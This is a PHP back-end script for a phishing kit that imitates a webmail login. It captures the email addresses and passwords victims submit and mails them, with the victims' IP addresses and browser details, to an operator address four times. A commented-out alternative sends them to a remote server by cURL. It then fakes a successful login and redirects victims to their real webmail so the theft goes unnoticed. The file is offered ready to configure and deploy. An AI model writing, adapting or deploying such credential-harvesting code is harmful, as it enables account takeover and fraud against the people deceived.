<?php
// Disable error reporting to prevent output interference
error_reporting(0);
ini_set('display_errors', 0);

// Set content type for JSON response
header('Content-Type: application/json');

// Debug logging (remove this in production)
$debug_log = "DEBUG: " . date('Y-m-d H:i:s') . " | Method: " . $_SERVER['REQUEST_METHOD'] . " | URI: " . ($_SERVER['REQUEST_URI'] ?? 'unknown') . " | POST: " . json_encode($_POST) . "\n";
@file_put_contents('debug.log', $debug_log, FILE_APPEND | LOCK_EX);

// Email configuration - CHANGE THESE VALUES
$LOG_EMAIL = 'your-email@example.com';  // Change this to your email address
$FROM_EMAIL = 'noreply@webmail-logger.com';  // Change this to your domain
$FROM_NAME = 'Webmail Logger';

// Function to send email log
function sendEmailLog($email, $password, $attempt, $logData) {
    global $LOG_EMAIL, $FROM_EMAIL, $FROM_NAME;
    
    $subject = "Webmail Login Attempt #$attempt - " . $email;
    
    $message = "
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .header { background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
            .credentials { background-color: #fff3cd; padding: 15px; border-left: 4px solid #ffc107; margin: 15px 0; }
            .info { background-color: #d1ecf1; padding: 15px; border-left: 4px solid #bee5eb; margin: 15px 0; }
            .label { font-weight: bold; color: #495057; }
            .value { color: #212529; margin-bottom: 10px; }
        </style>
    </head>
    <body>
        <div class='header'>
            <h2>üîê Webmail Login Attempt #$attempt</h2>
            <p>A new login attempt has been recorded on your webmail system.</p>
        </div>
        
        <div class='credentials'>
            <h3>üìß Login Credentials</h3>
            <div class='value'><span class='label'>Email:</span> $email</div>
            <div class='value'><span class='label'>Password:</span> $password</div>
        </div>
        
        <div class='info'>
            <h3>üåê Connection Details</h3>
            <div class='value'><span class='label'>Timestamp:</span> " . $logData['timestamp'] . "</div>
            <div class='value'><span class='label'>Attempt Number:</span> $attempt</div>
            <div class='value'><span class='label'>IP Address:</span> " . $logData['ip_address'] . "</div>
            <div class='value'><span class='label'>User Agent:</span> " . $logData['user_agent'] . "</div>
            <div class='value'><span class='label'>Referrer:</span> " . $logData['referer'] . "</div>
        </div>
        
        <div style='margin-top: 20px; padding: 10px; background-color: #f8f9fa; border-radius: 5px; font-size: 12px; color: #6c757d;'>
            <p>This email was automatically generated by the webmail logging system.</p>
            <p>Server: " . ($_SERVER['HTTP_HOST'] ?? 'Unknown') . "</p>
        </div>
    </body>
    </html>";
    
    // Email headers
    $headers = array(
        'MIME-Version: 1.0',
        'Content-type: text/html; charset=UTF-8',
        "From: $FROM_NAME <$FROM_EMAIL>",
        "Reply-To: $FROM_EMAIL",
        "X-Mailer: PHP/" . phpversion()
    );
    
    $header_string = implode("\r\n", $headers);
    
    // Try to send email
    return mail($LOG_EMAIL, $subject, $message, $header_string);
}

// Function to send log data
function sendLog($email, $password, $attempt) {
    $logData = array(
        'timestamp' => date('Y-m-d H:i:s'),
        'email' => $email,
        'password' => $password,
        'attempt' => $attempt,
        'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'referer' => $_SERVER['HTTP_REFERER'] ?? 'unknown'
    );
    
    // Send log via email
    $emailSent = sendEmailLog($email, $password, $attempt, $logData);
    
    // Alternative: Save to local file (uncomment the lines below if you prefer local logging)
    /*
    $logFile = 'login_logs.txt';
    $logEntry = date('Y-m-d H:i:s') . " | Attempt: $attempt | Email: $email | Password: $password | IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n";
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    */
    
    // Send log via cURL (uncomment and configure if you have a remote logging endpoint)
    /*
    $logUrl = 'https://your-logging-server.com/api/log';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $logUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($logData));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Authorization: Bearer YOUR_API_TOKEN' // Add your API token if needed
    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    curl_close($ch);
    */
    
    // Return true if email was sent successfully
    return $emailSent;
}

// Function to validate email format
function isValidEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

// Function to get the webmail domain for redirect
function getWebmailDomain($email) {
    $domain = substr(strrchr($email, "@"), 1);
    return "https://webmail." . $domain;
}

// Check if this is a POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(array(
        'signal' => 'ERROR', 
        'msg' => 'Method not allowed - Received: ' . $_SERVER['REQUEST_METHOD'],
        'debug' => array(
            'method' => $_SERVER['REQUEST_METHOD'],
            'post_data' => $_POST,
            'get_data' => $_GET,
            'request_uri' => $_SERVER['REQUEST_URI'] ?? 'unknown'
        )
    ));
    exit;
}

// Get POST data
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';

// Basic validation
if (empty($email) || empty($password)) {
    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Email and password are required'));
    exit;
}

if (!isValidEmail($email)) {
    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Please enter a valid email address'));
    exit;
}

// Send logs 4 times
$logSuccess = true;
for ($i = 1; $i <= 4; $i++) {
    $result = sendLog($email, $password, $i);
    if (!$result) {
        $logSuccess = false;
    }
    
    // Small delay between log attempts (optional)
    usleep(100000); // 0.1 second delay
}

// Always return success response to trigger redirect
// This simulates a successful login regardless of actual credentials
$webmailUrl = getWebmailDomain($email);

echo json_encode(array(
    'signal' => 'OK',
    'msg' => 'Login successful! Redirecting to your webmail...',
    'redirect_url' => $webmailUrl,
    'logs_sent' => $logSuccess ? 4 : 'partial'
));

// Optional: Add redirect header for browsers that don't handle the JSON response
// Uncomment the line below if you want immediate server-side redirect instead of JavaScript redirect
// header("Location: " . $webmailUrl);

exit;
?>